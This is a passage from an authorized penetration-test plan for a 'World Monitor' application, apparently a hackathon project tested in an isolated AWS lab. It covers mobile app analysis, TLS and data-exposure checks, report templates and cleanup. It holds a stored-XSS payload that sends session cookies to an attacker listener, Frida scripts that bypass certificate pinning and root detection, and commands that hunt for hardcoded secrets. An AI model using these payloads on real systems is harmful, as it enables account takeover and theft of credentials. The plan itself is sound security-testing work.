| Network Communication | MASVS-NETWORK | Cleartext HTTP, cert pinning bypass |
| Platform Interaction | MASVS-PLATFORM | Insecure WebView, deep link injection, clipboard |
| Code Quality | MASVS-CODE | Reverse engineering, debug flags, logging |
| Resilience | MASVS-RESILIENCE | Anti-debugging, root detection bypass |

### 9.2 Static Analysis (Without Running the App)

```bash
# Step 1: Extract APK from device or download from build
adb shell pm list packages | grep worldmonitor
adb shell pm path com.worldmonitor.app
adb pull /data/app/com.worldmonitor.app-1/base.apk ./mobile_analysis/worldmonitor.apk

# Step 2: Decompile with apktool (resources + manifest)
apktool d worldmonitor.apk -o mobile_analysis/apktool_out/

# Check for dangerous permissions in manifest
grep -Ei '(READ_CONTACTS|CAMERA|RECORD_AUDIO|READ_SMS|ACCESS_FINE_LOCATION)' \
  mobile_analysis/apktool_out/AndroidManifest.xml

# Check for debug mode enabled
grep -i 'android:debuggable' mobile_analysis/apktool_out/AndroidManifest.xml
# VULNERABLE if: android:debuggable="true"

# Check for cleartext traffic allowed
grep -i 'cleartextTrafficPermitted\|usesCleartextTraffic' \
  mobile_analysis/apktool_out/AndroidManifest.xml

# Step 3: Decompile to Java with jadx
jadx -d mobile_analysis/jadx_out/ mobile_analysis/worldmonitor.apk

# Search for hardcoded secrets
grep -rEi '(api_key|secret|password|token|private_key|aws_access)' \
  mobile_analysis/jadx_out/sources/ | grep -v '.class' | tee mobile_analysis/secrets.txt

# Search for weak crypto
grep -rEi '(MD5|SHA1|DES|RC4|AES/ECB)' mobile_analysis/jadx_out/sources/ \
  | tee mobile_analysis/weak_crypto.txt

# Step 4: Automated static scan with MobSF
# Upload APK to MobSF at http://localhost:8000
# Download JSON report after scan completes
curl -X POST http://localhost:8000/api/v1/upload \
  -H "Authorization: <mobsf_api_key>" \
  -F "file=@mobile_analysis/worldmonitor.apk" | jq '.hash' | tee mobile_analysis/mobsf_hash.txt

HASH=$(cat mobile_analysis/mobsf_hash.txt | tr -d '"')
curl -X POST http://localhost:8000/api/v1/scan \
  -H "Authorization: <mobsf_api_key>" -d "hash=$HASH"
curl "http://localhost:8000/api/v1/report_json?hash=$HASH" \
  -H "Authorization: <mobsf_api_key>" -o mobile_analysis/mobsf_report.json
```

### 9.3 Dynamic Analysis (App Running on Emulator/Device)

```bash
# Step 1: Setup Burp proxy on Android emulator
# AVD Settings → Proxy → 10.10.1.x:8080
# Install Burp CA cert via adb
adb push ~/cacert.der /sdcard/cacert.cer
# Device Settings → Security → Install from SD card

# Step 2: Run app, capture all traffic in Burp
# Look for:
# - HTTP (not HTTPS) requests
# - Auth tokens sent in URL query strings (?token=...)
# - PII sent in request bodies without encryption

# Step 3: Frida for runtime hooking
# Check if cert pinning is implemented
frida -U -f com.worldmonitor.app -l ~/tools/frida-scripts/ssl-pinning-bypass.js --no-pause

# Bypass root detection
frida -U -f com.worldmonitor.app -l ~/tools/frida-scripts/root-detection-bypass.js --no-pause

# Hook crypto operations to find keys
frida -U -f com.worldmonitor.app -l ~/tools/frida-scripts/android-crypto-monitor.js --no-pause

# Step 4: Check insecure local storage
adb shell run-as com.worldmonitor.app \
  cat /data/data/com.worldmonitor.app/shared_prefs/app_preferences.xml
# VULNERABLE if auth tokens, passwords, or PII found in plaintext

adb pull /data/data/com.worldmonitor.app/databases/ ./mobile_analysis/db/
sqlite3 mobile_analysis/db/app.db ".tables"
sqlite3 mobile_analysis/db/app.db "SELECT * FROM users LIMIT 5;"
# VULNERABLE if passwords, tokens stored in plaintext in SQLite
```

### 9.4 Mobile Evidence & False Positive Checks
- Screenshot of sensitive SharedPreferences content
- jadx code snippet showing hardcoded key location (file + line number)
- MobSF HTML/JSON report
- Burp traffic log showing cleartext HTTP or token in URL
- **FP Check — Cleartext traffic:** Confirm the endpoint is not a CDN asset (fonts, images) — only API calls with auth tokens count
- **FP Check — Hardcoded keys:** Attempt to use the key against the API; invalid/test keys are informational only

---

## 10. Phase 6 — Secure Communication & Data Storage
**OWASP:** A02:2021 — Cryptographic Failures | A09:2021 — Logging Failures

### 10.1 Test Cases

| ID | Test | Tool | CWE |
|---|---|---|---|
| TLS-01 | SSLv3 / TLS 1.0 / TLS 1.1 enabled | testssl.sh, nmap | CWE-326 |
| TLS-02 | Weak cipher suites (RC4, 3DES, NULL, EXPORT) | testssl.sh, sslyze | CWE-327 |
| TLS-03 | HSTS missing or max-age < 1 year | curl, testssl.sh | CWE-523 |
| TLS-04 | Certificate chain incomplete / self-signed | openssl | CWE-295 |
| TLS-05 | Mixed content (HTTP assets on HTTPS page) | Browser DevTools | CWE-319 |
| DATA-01 | PII in API responses (unnecessary exposure) | Burp, manual | CWE-359 |
| DATA-02 | Sensitive data in server error messages | Burp, wfuzz | CWE-209 |
| DATA-03 | Auth tokens / passwords in server access logs | EC2 log review | CWE-532 |
| DATA-04 | Database encryption at rest | AWS RDS config | CWE-311 |
| DATA-05 | Backup / debug endpoints exposing data | gobuster, manual | CWE-215 |

### 10.2 Key Test Commands

```bash
# TLS-01/02: Full TLS audit
~/tools/testssl.sh/testssl.sh --full --color 0 https://10.10.2.x | tee tls/testssl_full.txt
nmap --script ssl-enum-ciphers -p 443 10.10.2.x | tee tls/nmap_ciphers.txt
python3 -m sslyze 10.10.2.x:443 --json_out tls/sslyze.json

# TLS-03: HSTS check
curl -sI https://10.10.2.x | grep -i strict-transport-security
# Minimum acceptable: max-age=31536000; includeSubDomains

# TLS-04: Certificate chain
echo | openssl s_client -connect 10.10.2.x:443 -showcerts 2>/dev/null \
  | openssl x509 -noout -text

# DATA-02: Error-induced information disclosure
curl https://10.10.2.x/api/users/99999999999
curl "https://10.10.2.x/api/search?q='"
curl -X POST https://10.10.2.x/api/users -d ""

# DATA-03: Check app logs for token leakage
ssh -i pentest-key.pem ubuntu@10.10.2.x \
  "sudo grep -r 'Bearer\|password\|token' /var/log/nginx/ /var/log/app/ | head -50"

# DATA-05: Debug/backup endpoint discovery
for path in actuator debug .env server-status phpinfo.php backup.sql .git/config; do
  status=$(curl -sk -o /dev/null -w "%{http_code}" https://10.10.2.x/$path)
  echo "$status — $path"
done
```

> **FP Check TLS-01:** Confirm the server actually negotiates the weak protocol, not just advertises it — use `openssl s_client -ssl3` or `-tls1` to confirm negotiation. **FP Check DATA-01:** Distinguish between data returned because it was requested vs. data leaked that wasn't requested.

---

## 11. Phase 7 — Reporting & Deliverable Template

### 11.1 Vulnerability Finding Template

```markdown
---
## Finding #[N]: [Vulnerability Title]

**Severity:** Critical / High / Medium / Low / Informational
**CVSS 3.1 Score:** [0.0–10.0]
**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
**CWE:** CWE-[ID] — [Name]
**OWASP Category:** [e.g., A01:2021 – Broken Access Control]

### Description
[2–3 sentences: what the vulnerability is and why it exists]

### Affected Component
- **URL / Endpoint:** `https://10.10.2.x/api/...`
- **Parameter / Field:** `id`, `Authorization header`, etc.
- **HTTP Method:** GET / POST / PUT

### Steps to Reproduce
1. ...
2. ...
3. ...

### Proof of Concept
**Request:**
\`\`\`http
GET /api/users/102/profile HTTP/1.1
Host: 10.10.2.x
Authorization: Bearer <user_101_token>
\`\`\`

**Response:**
\`\`\`http
HTTP/1.1 200 OK
Content-Type: application/json

{"id":102,"name":"Jane Doe","email":"jane@example.com","phone":"9876543210"}
\`\`\`

**Screenshot:** [evidence/finding-N-screenshot.png]

### Business Impact
[2–3 sentences: what an attacker could do, data/systems at risk, business consequence]

### Remediation Recommendations
1. [Specific code-level fix]
2. [Configuration change]
3. [Additional control]

### References
- [OWASP WSTG link]
- [CWE link]
---
```

### 11.2 CVSS 3.1 Quick Reference

| Severity | Score Range | Example Vector |
|---|---|---|
| Critical | 9.0–10.0 | AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H |
| High | 7.0–8.9 | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N |
| Medium | 4.0–6.9 | AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N |
| Low | 0.1–3.9 | AV:N/AC:H/PR:H/UI:R/S:U/C:L/I:N/A:N |
| Info | 0.0 | No CVSS — informational only |

### 11.3 Sample Pre-Filled Findings

---
**Finding #1: Insecure Direct Object Reference (IDOR) — User Profile Endpoint**

**Severity:** High
**CVSS 3.1 Score:** 8.1
**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
**CWE:** CWE-639 — Authorization Bypass Through User-Controlled Key
**OWASP:** A01:2021 — Broken Access Control | API1:2023

**Description:** The `/api/users/{id}/profile` endpoint returns another user's full profile data when the `id` parameter is changed to a different user's ID. The server does not verify that the authenticated user owns the requested resource.

**Affected Component:** `GET https://10.10.2.x/api/users/{id}/profile` — `id` parameter

**Steps to Reproduce:**
1. Log in as test user A (ID: 101) and capture the request to `/api/users/101/profile`
2. Change the `id` from `101` to `102` in Burp Suite Repeater
3. Forward the modified request with User A's valid Bearer token
4. Observe that User B's (ID 102) full profile is returned

**Proof of Concept:**
```http
GET /api/users/102/profile HTTP/1.1
Host: 10.10.2.x
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.<user_101_payload>.<sig>

HTTP/1.1 200 OK
{"id":102,"name":"Jane Doe","email":"jane.doe@example.com","phone":"9876543210","address":"..."}
```

**Business Impact:** Any authenticated user can access any other user's PII. In a monitoring platform context, this could expose sensitive watch-list data, alert configurations, and personal contact information of all users.

**Remediation:**
1. Add server-side check: `if (requested_id != auth_token.user_id && !auth_token.is_admin) → 403`
2. Use UUID/ULID instead of sequential integer IDs to prevent enumeration
3. Apply Attribute-Based Access Control (ABAC) at the service layer

---

**Finding #2: Stored Cross-Site Scripting (XSS) — Alert Name Field**

**Severity:** High
**CVSS 3.1 Score:** 7.6
**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:H/A:N
**CWE:** CWE-79 — Improper Neutralization of Input During Web Page Generation
**OWASP:** A03:2021 — Injection

**Description:** The alert name field in the monitoring dashboard does not sanitize HTML/JavaScript input. A malicious payload stored via the API is executed in the browser of any user who views the dashboard, enabling session hijacking.

**Affected Component:** `POST https://10.10.2.x/api/alerts` — `name` field in request body

**Steps to Reproduce:**
1. Log in and create a new alert with name: `<script>document.location='http://10.10.1.x/steal?c='+document.cookie</script>`
2. Submit the alert via the API
3. Log in as a different user (or admin) and navigate to the Alerts Dashboard
4. Observe that the cookie is sent to the attacker-controlled listener at `10.10.1.x`

**Proof of Concept:**
```http
POST /api/alerts HTTP/1.1
Content-Type: application/json
Authorization: Bearer <attacker_token>

{"name":"<script>document.location='http://10.10.1.x/steal?c='+document.cookie</script>","threshold":100}
```
Listener: `python3 -m http.server 80` on 10.10.1.x captured: `GET /steal?c=session=abc123xyz`

**Business Impact:** An attacker can steal session cookies of any user including admins, take over accounts, and pivot to further access within the platform.

**Remediation:**
1. HTML-encode all user-supplied output at render time (`<` → `&lt;`)
2. Implement a strict Content Security Policy: `Content-Security-Policy: default-src 'self'; script-src 'self'`
3. Use a framework-level output encoding library (e.g., DOMPurify for React)

---

**Finding #3: Missing HTTP Strict Transport Security (HSTS) Header**

**Severity:** Medium
**CVSS 3.1 Score:** 5.3
**CVSS Vector:** CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N
**CWE:** CWE-523 — Unprotected Transport of Credentials
**OWASP:** A02:2021 — Cryptographic Failures

**Description:** The application does not set the `Strict-Transport-Security` (HSTS) HTTP header. Without HSTS, browsers will not enforce HTTPS-only connections, leaving users vulnerable to SSL-stripping attacks on untrusted networks.

**Affected Component:** All HTTPS responses from `https://10.10.2.x` — missing response header

**Steps to Reproduce:**
1. Send any HTTPS request to the application
2. Inspect response headers: `curl -sI https://10.10.2.x | grep -i strict`
3. No `Strict-Transport-Security` header is present

**Proof of Concept:**
```http
HTTP/1.1 200 OK
Content-Type: text/html
Server: nginx/1.24.0
# No Strict-Transport-Security header present
```

**Business Impact:** On public WiFi or compromised networks, an attacker can perform an SSL-strip attack to intercept credentials and session tokens transmitted by users who navigate to the site via HTTP.

**Remediation:**
1. Add HSTS header to all HTTPS responses: `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`
2. Submit domain to the HSTS preload list at hstspreload.org
3. Redirect all HTTP traffic to HTTPS at the web server level

---

### 11.4 Final Report Structure

```
World-Monitor-Security-Assessment-Report.pdf
│
├── 1. Executive Summary
│   ├── Overall risk posture
│   ├── Finding count by severity (pie chart)
│   └── Top 3 critical recommendations
│
├── 2. Scope & Methodology
│   ├── In-scope systems and IPs
│   ├── Testing dates and assessor info
│   └── Standards: OWASP WSTG 4.2, API Top 10 2023, MASVS 2.0, PTES
│
├── 3. Findings (sorted: Critical → High → Medium → Low → Info)
│   └── [One section per finding using the template above]
│
├── 4. Remediation Roadmap
│   ├── Priority 1 — Fix immediately (Critical/High)
│   ├── Priority 2 — Fix within 30 days (Medium)
│   └── Priority 3 — Fix within 90 days (Low/Info)
│
└── 5. Appendix
    ├── A — Tool versions and commands used
    ├── B — Raw nmap / testssl / nuclei output
    ├── C — Full HTTP request/response logs (Burp export)
    └── D — Testing timeline and activity log
```

### 11.5 Evidence Storage

```bash
# Upload final evidence bundle to S3
tar czf evidence-bundle-$(date +%Y%m%d).tar.gz evidence/
aws s3 cp evidence-bundle-*.tar.gz \
  s3://worldmonitor-pentest-evidence/final/ --region eu-north-1

aws s3 cp World-Monitor-Security-Assessment-Report.pdf \
  s3://worldmonitor-pentest-evidence/final/ --region eu-north-1
```

---

## 12. Risk Likelihood × Impact Matrix

Use this to prioritize which findings to report first and fix first.

```
         │ Impact →
         │  1-Negligible  2-Minor  3-Moderate  4-Major  5-Catastrophic
─────────┼────────────────────────────────────────────────────────────
5-Certain│     MED          HIGH      HIGH       CRIT       CRIT
4-Likely │     LOW          MED       HIGH       HIGH       CRIT
3-Possible│    LOW          LOW       MED        HIGH       HIGH
2-Unlikely│    INFO         LOW       LOW        MED        HIGH
1-Rare   │    INFO         INFO      LOW        LOW        MED
```

**Legend:** CRIT = Critical (fix immediately) | HIGH = High (fix < 7 days) | MED = Medium (fix < 30 days) | LOW = Low (fix < 90 days) | INFO = Informational

**Examples from sample findings:**
- IDOR (Finding #1): Likelihood=5 (Certain, trivially exploitable) × Impact=4 (Major, PII of all users) → **CRITICAL priority**
- Stored XSS (Finding #2): Likelihood=4 (Likely) × Impact=4 (Major, account takeover) → **CRITICAL priority**
- Missing HSTS (Finding #3): Likelihood=2 (Unlikely, needs MITM position) × Impact=4 (Major, cred theft) → **HIGH priority**

---

## 13. AWS Cost Budget

| Resource | Type | Daily Cost | 14-Day Total |
|---|---|---|---|
| Attacker EC2 (Spot, stopped nights) | t3.medium | ~$0.50 | ~$7 |
| Target EC2 (running test hours only) | t3.small | ~$0.75 | ~$10.50 |
| RDS (running test hours only) | db.t3.micro | ~$0.75 | ~$10.50 |
| S3 storage | ~10 GB | ~$0.01 | ~$0.14 |
| VPC / NAT (one-time setup, then deleted) | — | — | ~$5 |
| KMS + CloudTrail | — | ~$0.05 | ~$0.70 |
| **TOTAL** | | | **~$34** |

**Cost-saving tips:**
- Use Spot Instances for Kali attacker (saves ~70% vs on-demand)
- Stop EC2/RDS when not actively testing (nights/weekends)
- Delete NAT Gateway immediately after tools are installed
- Budget alert set at $50 via AWS Budgets (alert email: 7stardevelopers7777@gmail.com)
- $100 credit expires 2027-03-20 — well within window

---

## 14. Timeline

| Day | Phase | Activity |
|---|---|---|
| 1 | Setup | AWS VPC eu-north-1, EC2 instances, RDS, S3, tool installation |
| 2 | Setup | Deploy World Monitor app, seed test DB, validate connectivity |
| 3 | Recon | Passive recon, port scan, TLS audit, nuclei full scan |
| 4 | Recon | JS analysis, endpoint enumeration, attack surface map |
| 5–6 | Auth | All AUTH-01 through AUTH-15 test cases |
| 7–8 | Authz | All AUTHZ-01 through AUTHZ-08 test cases |
| 9–10 | Injection | All INJ-01 through INJ-11, GraphQL, API verb tests |
| 11 | Client-side | All CS-01 through CS-08 |
| 11 | Mobile | Phase 5b — static + dynamic mobile analysis |
| 12 | TLS/Data | All TLS-01 through DATA-05 |
| 13 | Reporting | Draft findings, PoC screenshots, CVSS scoring |
| 14 | Reporting | Final report, executive summary, remediation roadmap, demo video |

---

## 15. Tools Reference

| Tool | Version | Purpose | Install |
|---|---|---|---|
| Burp Suite Community | 2024.x | HTTP interception, active/passive scan | `burp*.sh` |
| OWASP ZAP | 2.15.x | Automated baseline scan | `snap install zaproxy` |
| sqlmap | 1.8.x | SQL injection detection | `apt install sqlmap` |
| Nikto | 2.1.x | Web server misconfiguration | `apt install nikto` |
| ffuf | 2.x | Directory/param fuzzing | `apt install ffuf` |
| gobuster | 3.6.x | Directory brute-force | `apt install gobuster` |
| jwt_tool | 2.x | JWT vulnerability testing | `git clone + pip3` |
| nuclei | 3.x | Template-based CVE scan | `go install nuclei` |
| wfuzz | 3.1.x | Parameter fuzzing | `pip3 install wfuzz` |
| testssl.sh | 3.2 | TLS/SSL full audit | `git clone` |
| nmap | 7.94 | Port/service enumeration | pre-installed Kali |
| sslyze | 5.x | TLS certificate analysis | `pip3 install sslyze` |
| retire.js | 4.x | Vulnerable JS library scan | `npm install -g retire` |
| gau | 2.x | URL extraction | `go install gau` |
| tplmap | latest | SSTI detection | `git clone + pip3` |
| Metasploit | 6.x | PoC exploitation (isolated) | pre-installed Kali |
| apktool | 2.9.x | Android APK decompile | `apt install apktool` |
| jadx | 1.5.x | Java/Kotlin decompiler | `apt install jadx` |
| MobSF | 3.9.x | Mobile static/dynamic analysis | Docker |
| Frida | 16.x | Runtime instrumentation | `pip3 install frida-tools` |
| objection | 1.11.x | Mobile runtime exploration | `pip3 install objection` |
| adb | 35.x | Android device bridge | pre-installed Kali |
| hashcat | 6.2.x | JWT secret brute force | pre-installed Kali |
| Hydra | 9.5.x | Credential brute force | pre-installed Kali |
| Python 3 + requests | 3.11+ | Custom PoC scripts | pre-installed Kali |

---

## 16. Post-Engagement Cleanup

Run all cleanup steps after the final report is delivered to NTRO.

```bash
REGION="eu-north-1"

# Step 1: Terminate EC2 instances
aws ec2 terminate-instances --region $REGION \
  --instance-ids <kali-instance-id> <target-instance-id>

# Step 2: Delete RDS instance (no final snapshot — test data only)
aws rds delete-db-instance --region $REGION \
  --db-instance-identifier worldmonitor-test \
  --skip-final-snapshot

# Step 3: Empty and delete S3 bucket
# First download all evidence locally
aws s3 sync s3://worldmonitor-pentest-evidence/ ./final-evidence-archive/ --region $REGION

# Confirm archive is complete, then empty and delete bucket
aws s3 rm s3://worldmonitor-pentest-evidence --recursive --region $REGION
aws s3api delete-bucket --bucket worldmonitor-pentest-evidence --region $REGION

# Step 4: Delete VPC resources
aws ec2 delete-subnet --region $REGION --subnet-id <subnet-a-id>
aws ec2 delete-subnet --region $REGION --subnet-id <subnet-b-id>
aws ec2 delete-security-group --region $REGION --group-id <attacker-sg-id>
aws ec2 delete-security-group --region $REGION --group-id <target-sg-id>
aws ec2 delete-vpc --region $REGION --vpc-id <vpc-id>

# Step 5: Delete KMS key (schedule for deletion — minimum 7 days)
aws kms schedule-key-deletion --region $REGION \
  --key-id <kms-key-id> --pending-window-in-days 7

# Step 6: Stop CloudTrail
aws cloudtrail stop-logging --region $REGION --name pentest-audit
aws cloudtrail delete-trail --region $REGION --name pentest-audit

# Step 7: Delete IAM users/policies created for testing
aws iam delete-user --user-name pentest-user

# Step 8: Verify no resources remain
aws ec2 describe-instances --region $REGION \
  --filters "Name=tag:Name,Values=kali-attacker,worldmonitor-target" \
  --query 'Reservations[].Instances[].State.Name'
# Expected: [] (empty — all terminated)
```

### Evidence Destruction Certificate

```
EVIDENCE DESTRUCTION CERTIFICATE

Date: _______________
Assessor: _______________
Assessment: World Monitor Security Assessment — NTRO / SIH

Actions completed:
  [ ] EC2 instances terminated (IDs: _______________)
  [ ] RDS instance deleted (no snapshot)
  [ ] S3 bucket emptied and deleted
  [ ] VPC and subnets deleted
  [ ] KMS key scheduled for deletion
  [ ] All test credentials revoked
  [ ] Final evidence archive stored securely: _______________
  [ ] Burp project file encrypted and archived: _______________

I certify that all temporary cloud resources used for this assessment
have been decommissioned and no test data remains in the cloud environment.

Signed: ___________________ Date: ___________
```

---

## 17. Smart Automation Integration
*(Aligns with SIH theme: Smart Automation)*

### 17.1 Automated Continuous Scanning with nuclei + GitHub Actions

```yaml
# .github/workflows/security-scan.yml
name: Continuous Security Scan

on:
  schedule:
    - cron: '0 2 * * *'    # Run daily at 02:00 UTC
  workflow_dispatch:        # Manual trigger

jobs:
  nuclei-scan:
    runs-on: ubuntu-latest
    steps:
      - name: Install nuclei
        run: go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

      - name: Update templates
        run: nuclei -update-templates

      - name: Run scan
        run: |
          nuclei -u ${{ secrets.TARGET_URL }} \
            -t cves/ -t misconfigurations/ -t exposures/ \
            -severity critical,high \
            -json -o nuclei_results.json

      - name: Upload results to S3
        run: |
          aws s3 cp nuclei_results.json \
            s3://worldmonitor-pentest-evidence/continuous/$(date +%Y%m%d)_scan.json \
            --region eu-north-1
        env:
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}

      - name: Alert on Critical Findings
        if: always()
        run: |
          CRITS=$(cat nuclei_results.json | jq '[.[] | select(.info.severity=="critical")] | length')
          if [ "$CRITS" -gt "0" ]; then
            curl -X POST https://hooks.slack.com/... \
              -d "{\"text\":\"ALERT: $CRITS critical findings in World Monitor scan\"}"
          fi
```

### 17.2 AI-Assisted Vulnerability Triage Concept

The SIH "Smart Automation" theme is addressed by integrating an LLM (Claude API) to auto-classify and prioritize findings:

```python
import anthropic
import json

client = anthropic.Anthropic()

def triage_finding(raw_finding: dict) -> dict:
    """Use Claude to enrich a raw nuclei finding with CVSS score, business impact, and remediation."""
    prompt = f"""
You are a senior security analyst. Given this raw vulnerability finding, provide:
1. CVSS 3.1 score and vector string
2. Business impact (2 sentences, specific to a monitoring/analytics platform)
3. Top 3 remediation steps (specific, actionable)
4. Priority: Critical/High/Medium/Low

Finding:
{json.dumps(raw_finding, indent=2)}

Respond in JSON format: {{"cvss_score": ..., "cvss_vector": ..., "business_impact": ..., "remediation": [...], "priority": ...}}
"""
    response = client.messages.create(
        model="claude-sonnet-4-6",
        max_tokens=1024,
        messages=[{"role": "user", "content": prompt}]
    )
    return json.loads(response.content[0].text)

# Process all nuclei findings
with open("nuclei_results.json") as f:
    findings = [json.loads(line) for line in f]

enriched = [triage_finding(f) for f in findings[:10]]  # Triage top 10
print(json.dumps(enriched, indent=2))
```

### 17.3 Scheduled Rescan Policy

| Scan Type | Frequency | Trigger | Scope |
|---|---|---|---|
| Full nuclei scan | Weekly (Sun 02:00 UTC) | GitHub Actions cron | All templates |
| TLS certificate check | Daily | testssl.sh cron job | HTTPS endpoints only |
| Endpoint inventory diff | On every deploy | CI/CD webhook | ffuf endpoint list |
| Dependency audit (retire.js) | On every frontend build | npm post-build hook | JS files |
| IDOR spot-check | Monthly | Manual + Burp | Auth'd API endpoints |

---

*Assessment authorized by NTRO. All testing confined to the isolated AWS VPC (eu-north-1). No production systems, users, or data affected. Account: vivek_aws (8267-8719-4506). Credits: $100 USD, expires 2027-03-20.*
